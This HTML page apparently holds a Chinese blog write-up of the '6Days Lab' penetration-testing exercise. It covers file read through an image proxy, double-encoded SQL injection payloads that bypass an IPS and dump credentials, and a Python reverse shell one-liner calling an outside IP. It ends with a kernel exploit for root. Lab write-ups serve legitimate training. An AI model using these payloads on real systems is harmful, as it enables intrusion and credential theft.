@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.ico">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="description" content="One way to choose one">
+    <meta name="author" content="Misaki">
+    <meta name="keywords" content="">
+    <title>6Days Lab - v1.0.1 ~ Misaki&#39;s Blog</title>
+    <link rel="stylesheet" href="/css/Material_Icons.css">
+    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/main.css">
+    
+        <link rel="stylesheet" href="/css/post.css">
+        
+            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+        
+    
+</head>
+
+<body class=" sidebar-collapse">
+<nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
+    <div class="container">
+        <div class="navbar-translate">
+            <a class="navbar-brand" href="/">
+                Misaki&#39;s Blog</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+            </button>
+        </div>
+            <div class="collapse navbar-collapse">
+                <ul class="navbar-nav ml-auto">
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/archives/">
+                                    archives
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/about/">
+                                    about
+                                </a>
+                            </li>
+                        
+                    
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github.com/MisakiKata" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-github"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://www.t00ls.net/members-profile-12179.html" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-twitch"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://misakikata.github.io/atom.xml" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-rss"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="mailto:misakikatas@gmail.com" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-envelope"></i>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+    </div>
+</nav>
+    
+  <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
+    
+      <div class="container">
+        <h1 class="title text-center post_title">6Days Lab - v1.0.1</h1>
+        <p class="text-center"><b>Wednesday, March 25th 2020, 3:35 pm</b></p>
+      </div>
+    
+  </div>
+
+  
+  
+  
+    <div class="row" style="margin: 0 0 0; z-index: 999;">
+  <div class="col-md-8 offset-md-1">
+    <div class="main main-raised">
+      <div class="container">
+        <div class="section">
+          <div class="post_content">
+              <p>访问首页发现一个是填入优惠码的地方，同时还发现一个未加载的图片。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153405.png" alt="image-20200324154403672"></p>
+<p>点击图片查看链接，发现是内网地址，估计是系统没把内网地址进行转换。</p>
+<pre><code>http://10.66.20.100/image.php?src=https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg
+</code></pre><p>不过可以通过此判断大概存在任意文件读取。再查看下面的优惠码，随便输入优惠码返回为空，但是输入单引号等会提示被IPS拦截。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153407.png" alt="image-20200324154610973"></p>
+<p>那么这里也可能有SQL注入。</p>
+<p>先查看上面文件读取是否可以读取到文件</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153409.png" alt="image-20200324154707368"></p>
+<p>再去读取优惠码页面，里面有个sql语句的拼接。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153411.png" alt="image-20200324154744119"></p>
+<p>再去查看config.php。发现数据库的账号密码</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153414.png" alt="image-20200324154854709"></p>
+<p>再去尝试读取本地系统文件</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153415.png" alt="image-20200324155044173"></p>
+<p>由于权限原因，是不能直接读取flag文件。尝试查找对应的目录</p>
+<pre><code>/proc/sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid。
+/proc/pid/cmdline   则可以看到对应pid进程的完整命令行。
+</code></pre><p>在查找内网端口服务的时候，发现80端口并没有开放，也就是内网端口和外部访问端口不一致，应该是做了端口转发出来。也许可以在内网端口上直接来执行SQL注入绕过IPS。遍历端口后发现8080端口是首页地址。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153417.png" alt="image-20200324172944910"></p>
+<p>测试双编码的情况下，可以绕过IPS，只是比在外部执行可以看到明显的返回。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153420.png" alt="image-20200324173354044"></p>
+<p>查询得知两字段</p>
+<pre><code>aaaa%2527union%2520select%25201,2%2523
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153422.png" alt="image-20200325095033797"></p>
+<p>库名，应该是需要查询<code>fancydb</code></p>
+<pre><code>aaa%2527%2520union%2520select%2520group_concat%2528schema_name%2529%252C2%2520from%2520information_schema.schemata%2523
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153423.png" alt="image-20200325095158899"></p>
+<p>查表名</p>
+<pre><code>aaa%2527%2520union%2520select%2520group_concat%2528table_name%2529%252C2%2520from%2520information_schema.tables%2520where%2520table_schema%253D0x66616e63796462%2523
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153425.png" alt="image-20200325095533778"></p>
+<p>字段名</p>
+<pre><code>aaa%2527%2520union%2520select%2520group_concat%2528column_name%2529%252C2%2520from%2520information_schema.columns%2520where%2520table_name%253D%2527users%2527%2523
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153427.png" alt="image-20200325095658267"></p>
+<p>查询到账号密码<code>andrea:SayNoToPentests</code></p>
+<pre><code>aaaaaa%2527%2520union%2520select%2520group_concat%2528username%252C0x3a%252Cpassword%2529%252C2%2520from%2520users%2523
+</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153431.png" alt="image-20200325095818906"></p>
+<p>尝试利用sql注入写文件，不过需要先把物理路径找到，尝试默认的apache路径<code>/var/www/html</code>，试过发现路径是如下</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153433.png" alt="image-20200325100055468"></p>
+<p>尝试导出文件失败，想起来用户非root，且不具备secure_file_priv。后来想找登陆和连接入口的时候感觉这个用户名比较眼熟，才想起来用户在passwd文件中出现过。且之前尝试搜索文件的时候尝试查找了用户下面的历史命令文件。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153434.png" alt="image-20200325102225242"></p>
+<p>那就直接试试ssh，确实可以登陆但是没有回显</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153437.png" alt="image-20200325102859382"></p>
+<p>尝试反弹shell，发现是个rbash，不能这么反弹shell</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153438.png" alt="image-20200325103330806"></p>
+<p>尝试python反弹</p>
+<pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;207.246.79.196&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
+</code></pre><p>获得反弹shell，同时使用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>，获取原生终端</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153440.png" alt="image-20200325103553741"></p>
+<p>目录下有个suid位文件，不过不能利用，权限不对。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153442.png" alt="image-20200325104928838"></p>
+<p>没有历史命令文件等，不可执行sudo，查找内核漏洞，内核还不算高。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153444.png" alt="image-20200325110140941"></p>
+<p>开启一个外网服务，下载到服务器，发现可以正常编译不报错。。。执行后获得root权限</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153445.png" alt="image-20200325110747898"></p>
+<p>找到根目录下的flag文件，是一个可执行文件。执行后提示完成</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200325153447.png" alt="image-20200325110822459"></p>
+<p>回过头再去看那个dog文件是啥，发现还是提示Access Denied。难道这玩意就是寻开心的？</p>
+
+          </div>
+          <br><br>
+              
+                <div class="license-wrapper">
+                    <p>原文作者：<a href="">Misaki</a>
+                    <p>原文链接：<a href="/2020/03/6Days-Lab-v1-0-1/">/2020/03/6Days-Lab-v1-0-1/</a>
+                    <p>发表日期：<a href="/2020/03/6Days-Lab-v1-0-1/">March 25th 2020, 3:35:02 pm</a>
+                    <p>更新日期：<a href="/2020/03/6Days-Lab-v1-0-1/">March 25th 2020, 3:35:02 pm</a>
+                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                </div>
+              
+          <br><br>
+          <div>
+              <p>
+                       
+                      <span class="badge badge-default">#&nbsp;渗透测试</span>
+                      &nbsp;
+                      
+              </p>
+          </div>
+        </div>
+      </div>  
+    </div>
+  </div>
+  <!-- TOC -->
+  
+      <div class="">
+        <div id="toc">
+          <p class="toc-title"><i class="material-icons" style="vertical-align:middle">toc</i>Toc:</p> 
+          <div id="tocbot"></div>
+        </div>
+      </div>
+  
+</div>
+
+
+<!-- Comments -->
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+    
+        
+            <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>               
+        var disqus_shortname = '';
+        var disqus_config = function () {
+            this.page.url = '/2020/03/6Days-Lab-v1-0-1/'; 
+            this.page.identifier = '/2020/03/6Days-Lab-v1-0-1/';
+        };
+        (function() { 
+            var d = document, s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+</div>
+        
+    
+    </div>
+</div>
+  
+
+<footer class="footer footer-default">
+        <div class="container">
+          <div class="float-left" style="padding: 15px 0;">
+              <b>假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！</b>
+          </div>
+          <div align="right" style="padding: 15px 0;">
+              <i class="iconfont icon-love" ></i>
+              <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+          </div>
+        </div>
+</footer>
+      <!--   Core JS Files   -->
+      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
+      <script src="/js/main.js"></script>
+      <script src="/js/core/popper.min.js"></script>
+      <script src="/js/core/bootstrap-material-design.min.js"></script>
+      <script src="/js/plugins/moment.min.js"></script>
+      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+        <script src="/js/post.js"></script>
+        <script src="/js/plugins/prettify.js"></script>
+        <script>
+            $(document).ready(function(){
+                $('pre').addClass('prettyprint linenums');
+                prettyPrint();
+            })
+        </script>
+      
+<script src="/live2d-widget/autoload.js"></script>
+</body>
+</html>
